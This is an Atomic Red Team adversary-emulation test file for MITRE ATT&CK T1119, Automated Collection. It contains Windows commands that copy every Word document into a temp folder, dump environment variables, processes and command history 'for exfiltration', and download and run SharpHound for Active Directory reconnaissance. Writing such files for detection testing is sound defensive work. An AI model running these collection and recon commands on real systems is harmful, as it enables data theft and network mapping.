attack_technique: T1119
display_name: Automated Collection
atomic_tests:
- name: Automated Collection Command Prompt
  auto_generated_guid: cb379146-53f1-43e0-b884-7ce2c635ff5b
  description: |
    Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection
    to see what was collected.
  supported_platforms:
  - windows
  executor:
    command: |
      mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
      dir c: /b /s .docx | findstr /e .docx
      for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection
    cleanup_command: |
      del %temp%\T1119_command_prompt_collection /F /Q >null 2>&1
    name: command_prompt
- name: Automated Collection PowerShell
  auto_generated_guid: 634bd9b9-dc83-4229-b19f-7f83ba9ad313
  description: |
    Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection
    to see what was collected.
  supported_platforms:
  - windows
  executor:
    command: |
      New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
      Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
    cleanup_command: |
      Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null
    name: powershell
- name: Recon information for export with PowerShell
  auto_generated_guid: c3f6d794-50dd-482f-b640-0384fbb7db26
  description: |
    collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
    to see what was collected.
  supported_platforms:
  - windows
  executor:
    command: |
      Get-Service > $env:TEMP\T1119_1.txt
      Get-ChildItem Env: > $env:TEMP\T1119_2.txt
      Get-Process > $env:TEMP\T1119_3.txt
    cleanup_command: |
      Remove-Item $env:TEMP\T1119_1.txt -ErrorAction Ignore
      Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
      Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
    name: powershell
- name: Recon information for export with Command Prompt
  auto_generated_guid: aa1180e2-f329-4e1e-8625-2472ec0bfaf3
  description: |
    collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
    to see what was collected.
  supported_platforms:
  - windows
  executor:
    command: |
      sc query type=service > %TEMP%\T1119_1.txt
      doskey /history > %TEMP%\T1119_2.txt
      wmic process list > %TEMP%\T1119_3.txt
      tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
    cleanup_command: |
      del %TEMP%\T1119_1.txt >nul 2>&1
      del %TEMP%\T1119_2.txt >nul 2>&1
      del %TEMP%\T1119_3.txt >nul 2>&1
      del %TEMP%\T1119_4.txt >nul 2>&1
    name: command_prompt
- name: Run BloodHound
  description: desc
  supported_platforms:
  - windows
  input_arguments:
    sharphound_exe:
      description: Location of the sharphound executable
      type: String
      default: PathToAtomicsFolder\T1119\bin\SharpHound.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must be domain joined
    prereq_command: |
      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}
    get_prereq_command: |
      Write-Host Joining this computer to a domain must be done manually
  - description: 'SharpHound executable must exist at #{sharphound_exe}'
    prereq_command: 'if (Test-Path #{sharphound_exe}) {exit 0} else {exit 1} '
    get_prereq_command: |
      New-Item -ItemType Directory (Split-Path #{sharphound_exe}) -Force | Out-Null
      Invoke-WebRequest "https://github.com/BloodHoundAD/BloodHound/raw/67cf1dee4f6c8d77a71b3eceb49b4040a5eb9550/Ingestors/SharpHound.exe" -OutFile #{sharphound_exe}
  executor:
    command: '#{sharphound_exe}'
    name: command_prompt
    cleanup_command:  del %TEMP%\*_BloodHound.zip >nul 2>&1